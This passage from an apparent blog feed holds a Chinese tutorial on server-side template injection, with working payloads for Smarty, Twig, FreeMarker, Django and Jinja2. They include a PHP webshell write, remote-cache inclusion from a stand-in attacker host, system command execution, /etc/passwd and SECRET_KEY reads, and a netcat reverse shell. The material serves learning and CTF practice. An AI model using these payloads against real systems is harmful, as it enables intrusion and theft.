Db::name(&#39;user&#39;)-&gt;whereTime(&#39;create_time&#39;,&#39;y&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><h3 id="四、其他查询"><a href="#四、其他查询" class="headerlink" title="四、其他查询"></a>四、其他查询</h3><p>1.查询指定时间的数据，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;whereTime(&#39;create_time&#39;,&#39;-2 hour&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><p>2.查询两个字段的数据有效期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;whereBetweenTimeField(&#39;create_time&#39;,&#39;create_time&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><p><code>return Db::getLastSql();</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ThinkPhP学习-第一天&quot;&gt;&lt;a href=&quot;#ThinkPhP学习-第一天&quot; class=&quot;headerlink&quot; title=&quot;ThinkPhP学习-第一天&quot;&gt;&lt;/a&gt;ThinkPhP学习-第一天&lt;/h1&gt;&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h2&gt;&lt;p&gt;.htaceess&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;IfModule mod_rewrite.c&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Options +FollowSymlinks -Multiviews&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  RewriteEngine On&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  RewriteCond %&amp;#123;REQUEST_FILENAME&amp;#125; !-d&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  RewriteCond %&amp;#123;REQUEST_FILENAME&amp;#125; !-f&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/IfModule&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;要改成这样，并且打开伪静态模块&lt;/p&gt;</summary>
    
    
    
    <category term="编程" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
    <category term="ThinkPHP" scheme="http://example.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>SSTI理解</title>
    <link href="http://example.com/2020/09/14/SSTI%E7%90%86%E8%A7%A3/"/>
    <id>http://example.com/2020/09/14/SSTI%E7%90%86%E8%A7%A3/</id>
    <published>2020-09-14T07:20:20.000Z</published>
    <updated>2020-09-25T04:11:32.389Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-、什么是SSTI"><a href="#一-、什么是SSTI" class="headerlink" title="一 、什么是SSTI"></a>一 、什么是SSTI</h1><h2 id="0x00-模板注入"><a href="#0x00-模板注入" class="headerlink" title="0x00 模板注入"></a>0x00 模板注入</h2><p>这是基于现在的MVC成熟的开发模式所导致的，开发者将输入通过V接收，交给C，然后由 C 调用 M 或者其他的 C 进行处理，最后再返回给 V ，这样就最终显示在我们的面前了，那么这里的 V 中就大量的用到了一种叫做<strong>模板</strong>的技术。<strong>这种模板的技术不是仅存在于Python</strong>，只要能使用模版进行开发的地方都会有这个问题，SSTI不属于任何一种的问题，沙盒绕过也不是。</p><h2 id="0x01常见的模板"><a href="#0x01常见的模板" class="headerlink" title="0x01常见的模板"></a>0x01常见的模板</h2><p>PHP：Smarty，Twig（经常出题），Blade</p><p>判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Twig </span><br><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125;  #输出49</span><br><span class="line">Jinja</span><br><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125;  #输出7777777</span><br></pre></td></tr></table></figure><p>Java：JSP，FreeMarker，Velocity</p><p>Python： Jinja2（常用），django，tornado</p><p>tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号中执行</p><a id="more"></a><h2 id="0x02-漏洞形成"><a href="#0x02-漏洞形成" class="headerlink" title="0x02 漏洞形成"></a>0x02 漏洞形成</h2><p>同SQL注入，别太相信用户的输入</p><h2 id="0x03-漏洞检测"><a href="#0x03-漏洞检测" class="headerlink" title="0x03 漏洞检测"></a>0x03 漏洞检测</h2><p>加payload进行输入，然后进行查看回显</p><h2 id="0x04-开始攻击"><a href="#0x04-开始攻击" class="headerlink" title="0x04 开始攻击"></a>0x04 开始攻击</h2><p>1.攻击方向</p><ul><li>模版本身</li><li>框架本身</li><li>语言本身</li><li>应用本身</li></ul><p>2.攻击方法</p><ul><li>模板本身支持的语法、内置变量、属性、函数，还有就是纯粹框架的全局变量、属性、函数</li><li>语言本身的特性，比如 面向对象的内省机制</li><li>寻找应用定义的一些东西，因为这个是几乎没有文档的，是开发者的自行设计，一般需要拿到应用的源码才能考虑</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注意：面向对象的语言中，获取父类这种思想要贯穿始终，</span><br><span class="line">理论基础：</span><br><span class="line">    Python 的魔法方法</span><br><span class="line">    PHP 的自省</span><br><span class="line">    JAVA 的反射机制</span><br></pre></td></tr></table></figure><h3 id="利用模板本身的特性进行攻击"><a href="#利用模板本身的特性进行攻击" class="headerlink" title="利用模板本身的特性进行攻击"></a>利用模板本身的特性进行攻击</h3><p>1.Smarty</p><p>这个模版不能执行PHP中直接进行命令的函数，但是对于语言的限制并不能够影响我们执行命令。(因为没有阅读文档，所以直接从大佬文章中摘抄)。<code>$</code>+内置变量可以访问各种环境变量，比如其中<strong>self得到smarty这个类</strong>，<strong>但是这个方法在3.x版本已经废弃，删掉了静态方法</strong>我们就可以开始去找文档中的好方法了</p><p><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385">getStreamVariable()</a></p><p>这个函数可以读文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#123;self::getStreamVariable(&quot;flag.php&quot;)&#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">class Smarty_Internal_Write_File</a></p><p>这是一个写文件的，这个类中有一个writeFile方法， </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smarty_Internal_Write_File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Writes file in a safe way to disk</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_filepath complete filepath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_contents file content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  Smarty $smarty    smarty instance</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> SmartyException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params">$_filepath, $_contents, Smarty $smarty</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $_error_reporting = error_reporting();</span><br><span class="line">        error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        <span class="keyword">if</span> ($smarty-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            $old_umask = umask(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_dirpath = dirname($_filepath);</span><br><span class="line">        <span class="comment">// if subdirs, create dir structure</span></span><br><span class="line">        <span class="keyword">if</span> ($_dirpath !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !file_exists($_dirpath)) &#123;</span><br><span class="line">            mkdir($_dirpath, $smarty-&gt;_dir_perms === <span class="literal">null</span> ? <span class="number">0777</span> : $smarty-&gt;_dir_perms, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write to tmp file, then move to overt file lock race condition</span></span><br><span class="line">        $_tmp_file = $_dirpath . DS . str_replace(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, uniqid(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents($_tmp_file, $_contents)) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Windows&#x27; rename() fails if the destination exists,</span></span><br><span class="line"><span class="comment">         * Linux&#x27; rename() properly handles the overwrite.</span></span><br><span class="line"><span class="comment">         * Simply unlink()ing a file might cause other processes</span></span><br><span class="line"><span class="comment">         * currently reading that file to fail, but linux&#x27; rename()</span></span><br><span class="line"><span class="comment">         * seems to be smart enough to handle that for us.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (Smarty::$_IS_WINDOWS) &#123;</span><br><span class="line">            <span class="comment">// remove original file</span></span><br><span class="line">            <span class="keyword">if</span> (is_file($_filepath)) &#123;</span><br><span class="line">                @unlink($_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            <span class="keyword">if</span> (!$success) &#123;</span><br><span class="line">                <span class="comment">// remove original file</span></span><br><span class="line">                <span class="keyword">if</span> (is_file($_filepath)) &#123;</span><br><span class="line">                    @unlink($_filepath);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// rename tmp file</span></span><br><span class="line">                $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$success) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_filepath&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($smarty-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// set file permissions</span></span><br><span class="line">            chmod($_filepath, $smarty-&gt;_file_perms);</span><br><span class="line">            umask($old_umask);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting($_error_reporting);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearConfig</span>(<span class="params">$varname = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Smarty_Internal_Extension_Config::clearConfig(<span class="keyword">$this</span>, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,<span class="string">&quot;&lt;?php eval(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125;</span><br></pre></td></tr></table></figure><p>常用的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;  #获取smarty的版本号</span><br><span class="line">&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;  #执行相应的php代码##在最新版已经废弃</span><br><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;  #全部的PHP条件表达式和函数都可以在if内使用，如||*，or，&amp;&amp;，and，is_array()等等，如：&#123;if is_array($array)&#125;&#123;&#x2F;if&#125;*，也可以执行php代码</span><br></pre></td></tr></table></figure><p>2.Twig</p><p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code>self::</code> 调用静态变量了。但是可以查阅<a href="https://twig.symfony.com/doc/2.x/templates.html">官方文档</a></p><p>Twig 给我们提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但是却有一个 env。env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置(不知道为什么官方文档没有看到这个方法，后来我找到了Twig 的源码中的 environment.php</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_setCache.png"></p><p>因此，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是这里就又需要我们的远程文件包含漏洞了。allow_url_include 一般是不打开的，没法包含远程文件。</p><p>新的大佬又出现了:</p><p> <a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p><p>我们只要把exec() 作为回调函数传进去就能实现命令执行了.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>版本3.x的payload,围绕几个fliter</p><ul><li>map</li></ul><p><code>&#123;&#123;["id"]|map("system")|join(",")``&#123;&#123;&#123;"<?php phpinfo();":"/var/www/html/shell.php"&#125;|map("file_put_contents")&#125;&#125;</code></code></p><ul><li>sort</li></ul><p><code>&#123;&#123;["id", 0]|sort("system")|join(",")&#125;&#125;</code></p><ul><li><p>filter</p><p><code>&#123;&#123;["id"]|filter("system")|join(",")&#125;&#125;</code></p></li><li><p>reduce</p><p><code>&#123;&#123;[0, 0]|reduce("system", "id")|join(",")&#125;&#125;</code></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#x2F;etc&#x2F;passwd&#39;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#39;&#x2F;etc&#x2F;passwd&#39;,&#39;&#39;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&#39;cat &#x2F;etc&#x2F;passwd&#39;]|filter(&#39;system&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>3.freeMarker</p><p>java模板</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure><p>查找文档，查看框架源码，等方式寻找这个 payload 的思路来源</p><h3 id="利用框架本身的特性进行攻击"><a href="#利用框架本身的特性进行攻击" class="headerlink" title="利用框架本身的特性进行攻击"></a>利用框架本身的特性进行攻击</h3><p>1.Django</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">request, *args, **kwargs</span>):</span></span><br><span class="line">    template = <span class="string">&#x27;Hello &#123;user&#125;, This is your email: &#x27;</span> + request.GET.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure><p>注入点很明显就是 email,但是我们能够做的事情已经被限制得很死了，很难再执行命令了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项</span><br></pre></td></tr></table></figure><p>我们发现，经过翻找，我发现Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件。</p><p>思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line">&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure><p>2.Flask/Jinja2</p><p>config 是Flask模版中的一个全局对象，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。虽然config是一个类字典对象，但是通过查阅文档可以发现 config 有很多神奇的方法：<code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code>, 以及<code>root_path</code>。这里我们利用 <code>from_pyfile</code> 和 <code>from_object</code> 来命令执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_pyfile</span>(<span class="params">self, filename, silent=False</span>):</span></span><br><span class="line"></span><br><span class="line">    filename = os.path.join(self.root_path, filename)</span><br><span class="line">    d = types.ModuleType(<span class="string">&#x27;config&#x27;</span>)</span><br><span class="line">    d.__file__ = filename</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filename) <span class="keyword">as</span> config_file:</span><br><span class="line">            exec(compile(config_file.read(), filename, <span class="string">&#x27;exec&#x27;</span>), d.__dict__)</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> silent <span class="keyword">and</span> e.errno <span class="keyword">in</span> (errno.ENOENT, errno.EISDIR):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        e.strerror = <span class="string">&#x27;Unable to load configuration file (%s)&#x27;</span> % e.strerror</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line">    self.from_object(d)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_object</span>(<span class="params">self, obj</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isinstance(obj, string_types):</span><br><span class="line">        obj = import_string(obj)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> dir(obj):</span><br><span class="line">        <span class="keyword">if</span> key.isupper():</span><br><span class="line">            self[key] = getattr(obj, key)</span><br></pre></td></tr></table></figure><p>这个方法将传入的文件使用 compile() 这个python 的内置方法将其编译成字节码(.pyc),并放到 exec() 里面去执行，注意最后一个参数 <code>d.__dict__</code>翻阅文档发现，这个参数的含义是指定 exec 执行的上下文，</p><p>这个方法会遍历 Obj 的 dict 并且找到大写字母的属性，将属性的值给 self[‘属性名’]，所以说如果我们能让 from_pyfile 去读这样的一个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from os import system</span><br><span class="line">SHELL &#x3D; system</span><br></pre></td></tr></table></figure><p>到时候我们就能通过 config[‘SHELL’] 调用 system 方法了</p><p>那么文件怎么写入呢？Jinja2 有沙盒机制，我们必须通过绕过沙盒的方式写入我们想要的文件，具体的沙盒绕过,大佬的一篇博文[python 沙盒逃逸备忘](<a href="http://www.k0rz3n.com/2018/05/04/Python">http://www.k0rz3n.com/2018/05/04/Python</a> 沙盒逃逸备忘/)</p><p>payload:</p><h3 id="1-python2"><a href="#1-python2" class="headerlink" title="1.python2"></a>1.python2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;写文件</span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;加载system</span><br><span class="line">&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;执行命令反弹SHELL</span><br></pre></td></tr></table></figure><p>使用file类读取文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span>(c.__name__==<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        print(c)</span><br><span class="line">        <span class="keyword">print</span> c(<span class="string">&#x27;joker.txt&#x27;</span>).readlines()</span><br><span class="line">封装一下：</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;file&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123; c(<span class="string">&quot;/etc/passwd&quot;</span>).readlines() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>使用内置模块进行命令执行</p><p><code>__globals__</code>查看内置的对象可以调用的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">search = <span class="string">&#x27;os&#x27;</span>   <span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i 